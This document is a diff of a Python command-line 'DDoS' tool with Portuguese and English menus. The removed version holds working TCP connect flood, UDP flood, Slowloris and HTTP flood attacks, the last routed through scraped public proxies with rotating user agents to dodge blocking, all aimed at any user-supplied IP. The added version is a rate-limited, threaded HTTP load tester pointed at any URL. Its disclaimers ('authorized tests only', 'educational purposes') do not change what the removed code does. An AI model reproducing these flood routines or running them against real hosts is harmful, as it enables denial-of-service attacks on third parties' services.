@@ -1,324 +1,232 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-import socket
+import requests
 import threading
 import time
 import random
-import os
-import sys
 from datetime import datetime
-import requests
-from bs4 import BeautifulSoup
+import sys
+import os
 
-class DDoSSimulator:
-    def __init__(self):
-        self.target_ip = ""
-        self.target_port = 80
-        self.thread_count = 100
-        self.attack_running = False
-        self.requests_sent = 0
-        self.proxies = []
-        self.current_proxy = 0
-        self.attack_method = "TCP_SYN"
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-            "Mozilla/5.0 (X11; Linux x86_64)",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
-            "Mozilla/5.0 (Android 10; Mobile; rv:91.0)"
-        ]
-        self.banner = """
-\033[91m
-██████╗ ██████╗  ██████╗ ███████╗    ███████╗████████╗██████╗ ███████╗███████╗███████╗
-██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
-██║  ██║██║  ██║██║   ██║███████╗    ███████╗   ██║   ██████╔╝█████╗  █████╗  ███████╗
-██║  ██║██║  ██║██║   ██║╚════██║    ╚════██║   ██║   ██╔═══╝ ██╔══╝  ██╔══╝  ╚════██║
-██████╔╝██████╔╝╚██████╔╝███████║    ███████║   ██║   ██║     ███████╗███████╗███████║
-╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚══════╝╚══════╝
-\033[0m
-\033[93m╔══════════════════════════════════════════════════════════════╗
-║   FERRAMENTA DE SIMULAÇÃO DE ESTRESSE - v3.0            ║
-║        USO EXCLUSIVO PARA TESTES AUTORIZADOS            ║
-╚══════════════════════════════════════════════════════════╝\033[0m
-"""
+# Lista de User-Agents aleatórios para evitar bloqueios básicos
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+]
 
-    def clear_screen(self):
-        os.system('cls' if os.name == 'nt' else 'clear')
+# Métodos HTTP suportados
+HTTP_METHODS = ["GET", "POST", "HEAD"]
 
-    def print_banner(self):
-        self.clear_screen()
-        print(self.banner)
+def clear_screen():
+    """Limpa a tela do console"""
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    def validate_ip(self, ip):
-        try:
-            parts = ip.split('.')
-            if len(parts) != 4:
-                return False
-            for part in parts:
-                if not 0 <= int(part) <= 255:
-                    return False
-            return True
-        except:
-            return False
+def display_banner():
+    """Exibe o banner estilizado"""
+    print("""
+    \033[1;31m
+    ██████╗ ██████╗  ██████╗ ███████╗    ████████╗███████╗███████╗████████╗
+    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
+    ██║  ██║██║  ██║██║   ██║███████╗       ██║   █████╗  ███████╗   ██║   
+    ██║  ██║██║  ██║██║   ██║╚════██║       ██║   ██╔══╝  ╚════██║   ██║   
+    ██████╔╝██████╔╝╚██████╔╝███████║       ██║   ███████╗███████║   ██║   
+    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   
+    \033[0m
+    \033[1;33m[+] Stress Test Tool - For Educational Purposes Only [+]\033[0m
+    \033[1;36mVersion: 2.0 | Author: Anonymous | License: MIT\033[0m
+    """)
 
-    def load_proxies(self):
-        print("\n[+] Carregando proxies públicos...")
-        try:
-            url = "https://www.sslproxies.org/"
-            r = requests.get(url)
-            soup = BeautifulSoup(r.content, 'html.parser')
-            proxies_table = soup.find('table', {'id': 'proxylisttable'})
-            
-            for row in proxies_table.tbody.find_all('tr'):
-                cols = row.find_all('td')
-                if len(cols) >= 2:
-                    ip = cols[0].text.strip()
-                    port = cols[1].text.strip()
-                    self.proxies.append(f"{ip}:{port}")
-            
-            print(f"[+] {len(self.proxies)} proxies carregados com sucesso!")
-        except Exception as e:
-            print(f"[!] Erro ao carregar proxies: {str(e)}")
-            print("[+] Usando conexão direta (sem proxy)")
-        time.sleep(2)
+def display_menu():
+    """Exibe o menu de opções"""
+    print("\n\033[1;34m[ MENU ]\033[0m")
+    print("\033[1;32m1. Start Test")
+    print("2. Configure Test Parameters")
+    print("3. View Previous Logs")
+    print("4. Exit\033[0m")
 
-    def get_next_proxy(self):
-        if not self.proxies:
-            return None
+def send_request(url, method="GET", timeout=5):
+    """Envia uma requisição HTTP"""
+    headers = {"User-Agent": random.choice(USER_AGENTS)}
+    try:
+        if method == "GET":
+            response = requests.get(url, headers=headers, timeout=timeout)
+        elif method == "POST":
+            response = requests.post(url, headers=headers, timeout=timeout)
+        elif method == "HEAD":
+            response = requests.head(url, headers=headers, timeout=timeout)
         
-        self.current_proxy = (self.current_proxy + 1) % len(self.proxies)
-        return self.proxies[self.current_proxy]
+        log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[1;34m{method}\033[0m {url} - \033[1;32mStatus: {response.status_code}\033[0m"
+        print(log)
+        return log
+    except requests.exceptions.RequestException as e:
+        error_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[1;31mError: {method} {url} - {str(e)}\033[0m"
+        print(error_log)
+        return error_log
 
-    def tcp_syn_attack(self):
-        while self.attack_running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.connect((self.target_ip, self.target_port))
-                s.close()
-                self.requests_sent += 1
-            except:
-                pass
+def ddos_test(url, method="GET", num_threads=10, duration=60, requests_per_second=10):
+    """Executa o teste de carga controlado"""
+    clear_screen()
+    display_banner()
+    
+    print(f"\n\033[1;33m[+] Starting controlled test on {url} ({method}) for {duration} seconds...\033[0m")
+    print(f"\033[1;36m[+] Threads: {num_threads} | Max Requests/s: {requests_per_second}\033[0m\n")
+    
+    logs = []
+    end_time = time.time() + duration
+    request_interval = 1.0 / requests_per_second  # Intervalo entre requisições
 
-    def http_flood_attack(self):
-        headers = {
-            'User-Agent': random.choice(self.user_agents),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Connection': 'keep-alive'
-        }
+    def worker():
+        while time.time() < end_time:
+            log = send_request(url, method)
+            logs.append(log)
+            time.sleep(request_interval)  # Controla a taxa de requisições
 
-        while self.attack_running:
-            proxy = self.get_next_proxy()
-            proxies = {'http': f'http://{proxy}'} if proxy else None
-            
-            try:
-                if proxy:
-                    requests.get(f"http://{self.target_ip}", headers=headers, 
-                               proxies=proxies, timeout=2)
-                else:
-                    requests.get(f"http://{self.target_ip}", headers=headers, 
-                               timeout=2)
-                self.requests_sent += 1
-            except:
-                pass
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=worker)
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
 
-    def udp_flood_attack(self):
-        while self.attack_running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                payload = random._urandom(1024)
-                s.sendto(payload, (self.target_ip, self.target_port))
-                s.close()
-                self.requests_sent += 1
-            except:
-                pass
+    # Barra de progresso
+    print("\n\033[1;35mTest Progress:\033[0m")
+    start_time = time.time()
+    while time.time() < end_time:
+        elapsed = time.time() - start_time
+        remaining = max(0, duration - elapsed)
+        progress = min(100, (elapsed / duration) * 100)
+        
+        sys.stdout.write("\r")
+        sys.stdout.write(f"[{'=' * int(progress/2)}{' ' * (50 - int(progress/2))}] {progress:.1f}% | "
+                         f"Elapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s")
+        sys.stdout.flush()
+        time.sleep(0.1)
 
-    def slowloris_attack(self):
-        headers = [
-            "User-Agent: {}".format(random.choice(self.user_agents)),
-            "Accept-language: en-US,en,q=0.5"
-        ]
+    for thread in threads:
+        thread.join()
 
-        sockets = []
-        for _ in range(100):
-            if not self.attack_running:
-                break
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                s.connect((self.target_ip, self.target_port))
-                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
-                for header in headers:
-                    s.send("{}\r\n".format(header).encode())
-                sockets.append(s)
-                self.requests_sent += 1
-            except:
-                pass
+    # Salva logs em um arquivo
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_filename = f"ddos_test_log_{timestamp}.txt"
+    with open(log_filename, "w") as f:
+        f.write("\n".join(logs))
+    
+    print(f"\n\n\033[1;32m[+] Test completed. Logs saved to '{log_filename}'.\033[0m")
+    input("\nPress Enter to return to menu...")
 
-        while self.attack_running:
-            for s in sockets:
-                try:
-                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
-                    self.requests_sent += 1
-                except:
-                    sockets.remove(s)
-                    try:
-                        s.close()
-                    except:
-                        pass
-            time.sleep(15)
-
-    def start_attack(self):
-        if not self.validate_ip(self.target_ip):
-            print("\n\033[91m[!] Endereço IP inválido!\033[0m")
-            time.sleep(1)
+def view_logs():
+    """Visualiza logs anteriores"""
+    clear_screen()
+    display_banner()
+    
+    print("\n\033[1;33m[ PREVIOUS LOGS ]\033[0m")
+    
+    log_files = [f for f in os.listdir() if f.startswith("ddos_test_log_") and f.endswith(".txt")]
+    
+    if not log_files:
+        print("\033[1;31mNo log files found.\033[0m")
+        input("\nPress Enter to return to menu...")
+        return
+    
+    for i, log_file in enumerate(log_files, 1):
+        print(f"{i}. {log_file}")
+    
+    try:
+        choice = int(input("\nSelect log file to view (0 to cancel): "))
+        if choice == 0:
             return
-
-        self.print_banner()
-        print(f"\n\033[91m[+] INICIANDO ATAQUE {self.attack_method} CONTRA {self.target_ip}:{self.target_port}\033[0m")
-        print(f"[+] Threads: {self.thread_count}")
-        print(f"[+] Proxies disponíveis: {len(self.proxies)}")
-        print("[+] Pressione Ctrl+C para parar\n")
-
-        self.attack_running = True
-        self.requests_sent = 0
-        start_time = time.time()
-
-        attack_methods = {
-            "TCP_SYN": self.tcp_syn_attack,
-            "HTTP_FLOOD": self.http_flood_attack,
-            "UDP_FLOOD": self.udp_flood_attack,
-            "SLOWLORIS": self.slowloris_attack
-        }
-
-        threads = []
-        for _ in range(self.thread_count):
-            t = threading.Thread(target=attack_methods[self.attack_method])
-            t.daemon = True
-            t.start()
-            threads.append(t)
-
-        try:
-            while True:
-                elapsed = time.time() - start_time
-                print(f"\r[+] Requisições: {self.requests_sent} | Taxa: {int(self.requests_sent/elapsed)}/s | Proxies: {len(self.proxies)}", end='')
-                time.sleep(0.5)
-        except KeyboardInterrupt:
-            self.attack_running = False
-            print("\n\n[+] Parando ataque...")
-            
-            for t in threads:
-                t.join(timeout=1)
-            
-            elapsed = time.time() - start_time
-            print(f"\n[+] Ataque concluído!")
-            print(f"[+] Total de requisições: {self.requests_sent}")
-            print(f"[+] Duração: {elapsed:.2f} segundos")
-            print(f"[+] Taxa média: {int(self.requests_sent/elapsed)} req/s")
-            input("\n[Pressione Enter para continuar...")
-
-    def show_menu(self):
-        while True:
-            self.print_banner()
-            print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
-            print("║                         MENU PRINCIPAL                         ║")
-            print("╠══════════════════════════════════════════════════════════════╣")
-            print("║ 1. Definir Alvo                                              ║")
-            print("║ 2. Carregar Proxies                                          ║")
-            print("║ 3. Configurar Ataque                                         ║")
-            print("║ 4. Iniciar Simulação                                         ║")
-            print("║ 5. Sair                                                      ║")
-            print("╚══════════════════════════════════════════════════════════════╝\033[0m")
-            
-            choice = input("\n\033[92m[DDoS-SIM]>\033[0m Escolha uma opção: ")
-            
-            if choice == '1':
-                self.set_target()
-            elif choice == '2':
-                self.load_proxies()
-            elif choice == '3':
-                self.configure_attack()
-            elif choice == '4':
-                self.start_attack()
-            elif choice == '5':
-                print("\n\033[93m[+] Encerrando ferramenta...\033[0m")
-                sys.exit(0)
-            else:
-                print("\n\033[91m[!] Opção inválida!\033[0m")
-                time.sleep(1)
-
-    def set_target(self):
-        self.print_banner()
-        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
-        print("║                       DEFINIR ALVO                                ║")
-        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
+        selected_file = log_files[choice-1]
         
-        ip = input("\n[+] IP do alvo: ").strip()
-        if not self.validate_ip(ip):
-            print("\033[91m[!] IP inválido! Formato esperado: 192.168.1.1\033[0m")
+        with open(selected_file, "r") as f:
+            logs = f.read()
+        
+        clear_screen()
+        print(f"\n\033[1;33mContents of {selected_file}:\033[0m\n")
+        print(logs)
+        
+    except (ValueError, IndexError):
+        print("\033[1;31mInvalid selection.\033[0m")
+    except Exception as e:
+        print(f"\033[1;31mError: {str(e)}\033[0m")
+    
+    input("\nPress Enter to return to menu...")
+
+def configure_test():
+    """Configura os parâmetros do teste"""
+    clear_screen()
+    display_banner()
+    
+    print("\n\033[1;33m[ CONFIGURE TEST ]\033[0m")
+    
+    config = {
+        "url": input("Enter target URL (e.g., http://example.com): ").strip(),
+        "method": input("HTTP Method (GET/POST/HEAD, default GET): ").strip().upper() or "GET",
+        "num_threads": int(input("Number of threads (default 10): ") or 10),
+        "duration": int(input("Test duration in seconds (default 60): ") or 60),
+        "requests_per_second": int(input("Max requests per second (default 10): ") or 10)
+    }
+    
+    if config["method"] not in HTTP_METHODS:
+        print("\033[1;33mInvalid HTTP method. Using GET.\033[0m")
+        config["method"] = "GET"
+    
+    return config
+
+def main():
+    """Função principal"""
+    clear_screen()
+    display_banner()
+    
+    # Configurações padrão
+    test_config = {
+        "url": "",
+        "method": "GET",
+        "num_threads": 10,
+        "duration": 60,
+        "requests_per_second": 10
+    }
+    
+    while True:
+        clear_screen()
+        display_banner()
+        display_menu()
+        
+        choice = input("\n\033[1;35mSelect an option: \033[0m")
+        
+        if choice == "1":  # Start Test
+            if not test_config["url"]:
+                print("\033[1;31mPlease configure test parameters first.\033[0m")
+                input("\nPress Enter to continue...")
+                continue
+                
+            ddos_test(
+                test_config["url"],
+                test_config["method"],
+                test_config["num_threads"],
+                test_config["duration"],
+                test_config["requests_per_second"]
+            )
+            
+        elif choice == "2":  # Configure Test
+            new_config = configure_test()
+            test_config.update(new_config)
+            print("\033[1;32mConfiguration saved.\033[0m")
+            input("\nPress Enter to continue...")
+            
+        elif choice == "3":  # View Logs
+            view_logs()
+            
+        elif choice == "4":  # Exit
+            print("\n\033[1;33m[+] Exiting... Thank you for using DDoS Test Tool!\033[0m")
             time.sleep(1)
-            return
-        
-        try:
-            port = int(input("[+] Porta (80 padrão): ").strip() or "80")
-            if not 1 <= port <= 65535:
-                raise ValueError
-        except:
-            print("\033[91m[!] Porta inválida! Use entre 1-65535\033[0m")
+            break
+            
+        else:
+            print("\033[1;31mInvalid option. Please try again.\033[0m")
             time.sleep(1)
-            return
-        
-        self.target_ip = ip
-        self.target_port = port
-        print("\n\033[92m[+] Alvo configurado com sucesso!\033[0m")
-        time.sleep(1)
-
-    def configure_attack(self):
-        self.print_banner()
-        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
-        print("║                      CONFIGURAR ATAQUE                             ║")
-        print("╠══════════════════════════════════════════════════════════════╣")
-        print("║ 1. TCP SYN Flood (Padrão)                                     ║")
-        print("║ 2. HTTP Flood (Com proxies)                                   ║")
-        print("║ 3. UDP Flood                                                  ║")
-        print("║ 4. Slowloris (Conexões parciais)                              ║")
-        print("║ 5. Voltar                                                     ║")
-        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
-        
-        choice = input("\n\033[92m[DDoS-SIM]>\033[0m Escolha o método: ")
-        
-        methods = {
-            '1': 'TCP_SYN',
-            '2': 'HTTP_FLOOD',
-            '3': 'UDP_FLOOD',
-            '4': 'SLOWLORIS'
-        }
-        
-        if choice in methods:
-            self.attack_method = methods[choice]
-            print(f"\n\033[92m[+] Método configurado: {self.attack_method}\033[0m")
-        elif choice != '5':
-            print("\033[91m[!] Opção inválida!\033[0m")
-        
-        try:
-            threads = int(input("[+] Número de threads (1-500): ").strip() or "100")
-            if 1 <= threads <= 500:
-                self.thread_count = threads
-            else:
-                print("\033[91m[!] Use entre 1-500 threads\033[0m")
-        except:
-            print("\033[91m[!] Valor inválido!\033[0m")
-        
-        time.sleep(1)
 
 if __name__ == "__main__":
     try:
-        tool = DDoSSimulator()
-        tool.show_menu()
+        main()
     except KeyboardInterrupt:
-        print("\n\033[93m[+] Ferramenta encerrada pelo usuário\033[0m")
+        print("\n\033[1;33m[+] Operation cancelled by user. Exiting...\033[0m")
         sys.exit(0)
-    except Exception as e:
-        print(f"\n\033[91m[!] Erro fatal: {str(e)}\033[0m")
-        sys.exit(1)
